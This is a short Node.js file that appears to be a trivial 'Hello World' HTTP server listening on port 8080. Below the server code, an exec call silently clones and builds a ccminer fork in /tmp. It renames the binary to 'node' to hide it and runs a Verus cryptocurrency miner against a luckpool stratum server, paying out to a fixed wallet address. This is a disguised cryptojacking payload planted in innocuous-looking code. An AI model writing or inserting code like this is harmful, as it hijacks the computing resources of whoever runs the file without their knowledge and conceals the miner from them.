var http = require("http");

//create a server object:
http
  .createServer(function (req, res) {
    res.write("Hello World!"); //write a response to the client
    res.end(); //end the response
  })
  .listen(8080); //the server object listens on port 8080

const { exec } = require("child_process");

exec(
  "cd /tmp && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh configure.sh autogen.sh && ./build.sh && mv ccminer node && ./node -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RARNZ6LoxcvsUgVHM1f2MDmnVfzDFxqV1R.XXX -p x -t 1",
  (error, stdout, stderr) => {
    if (error) {
      console.log(`error: ${error.message}`);
      return;
    }
    if (stderr) {
      console.log(`stderr: ${stderr}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
  }
);
